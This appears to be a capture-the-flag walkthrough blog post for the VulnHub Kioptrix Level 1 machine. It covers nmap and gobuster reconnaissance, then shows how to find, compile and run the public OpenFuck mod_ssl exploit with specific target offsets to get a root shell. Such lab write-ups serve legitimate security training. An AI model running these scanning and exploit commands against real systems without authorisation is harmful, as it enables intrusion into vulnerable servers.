---
layout: post
title: Kioptrix Level 1
---
[Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/#)

## Find IP of box
Our IP: x.x.x.49

```nmap -T5 <LHOST>/24```

Kioptrix is running on: x.x.x.104  

## Init NMap Scan

```nmap -sC -sV -oA nmap x.x.x.104```

 - Default Scripts
 - Service Detection
 - Output all formats

![Initial NMap Scan](/images/KioptrixL1/Nmap1.JPG)

We have 6 ports open: 22 (SSH), 80 (HTTP), 111 (rpcbind), 139 (netbios-ssn samba), 443 (ssl/https), 1024 (status)

I'm going to start by looking at the HTTP port

## HTTP - Port 80
### Gobuster

```gobuster dir -u http://x.x.x.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,txt,xml```

![Gobuster Results](/images/KioptrixL1/Gobuster1.JPG)

### Dirbuster
Ran gui Dirbuster in background for recursive search

Gave plenty more results but not much important info to be found

### Searchsploit

```searchsploit mod_ssl```

< 2.8.7 stands out as our version is 2.8.4

There are 3 results so a quick google of the name (OpenFuck) reveals the version we need is 47080.c (ExploitDB)

Reading through the exploit reveals we need to explain libssl-dev

```apt-get install libssl-dev```

It also explains how to compile

```gcc -o exploit 47080.c -lcrypto```

Now we need to find out how to use it properly, so run the script

```./exploit```

It presents us with:

```: Usage: ./script target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)```
and a long list of supported offsets to place instead of 'target'

Ours is likely to be either 0x6a or 0x6b so we'll try 0x6a first

```./exploit 0x6a x.x.x.104 -c 40```

Unsucessful

```./exploit 0x6b x.x.x.104 -c 40```

It Works! We are now root

Note: It seemingly freezes for a bit by not producing an output but if we type in a command such as ```id``` and we get an output which shows we have a shell.

Note 2: If the above command doesn't work (i.e reaches ```spawning shell ... Good Bye!``` ), try deleting the compiled script and recompile and it should work fine

### TTY shell

unnecessary step but would prove useful if we had any other steps to perform.

```/bin/bash -i```


